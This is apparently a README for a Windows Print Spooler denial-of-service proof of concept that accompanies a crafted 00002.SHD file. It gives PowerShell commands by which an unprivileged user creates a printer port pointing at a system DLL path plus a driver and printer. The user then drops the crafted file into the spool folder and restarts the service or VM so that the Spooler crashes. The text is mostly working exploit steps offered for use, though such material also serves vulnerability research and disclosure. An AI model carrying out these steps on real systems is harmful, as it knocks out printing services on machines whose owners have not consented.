# Spooler DoS
The folder contains the ```00002.SHD``` file which crashes the Spooler service once processed.

## Exploit Instructions
The file will crash the Windows 10 Print Spooler service (64-bit), but can also crash previous versions (also 32-bit) by using different offsets.

You can use our 010 Editor Templates for modifying the SHD files more conveniently.

------

1. Add a virtual printer port, printer driver and virtual printer (by using an unprivileged user:)
   ```
   Add-PrinterPort "c:\windows\system32\wbem\wbemcomn.dll";
   Add-PrinterDriver "SBPrinter";
   Add-Printer -Name "SBPrinter" -DriverName "MS Publisher Color Printer" -PortName "c:\windows\system32\wbem\wbemcomn.dll";
   ```
2. Copy the crafted SHD file, and a blank file named ```00012.SPL``` to the  ```c:\windows\system32\spool\PRINTERS\``` folder.
3. Restart the service by using an Administrator, or the VM by using the unprivileged user.
4. The Print Spooler service will process the SHD file, will try to dereference an invalid memory address and will crash.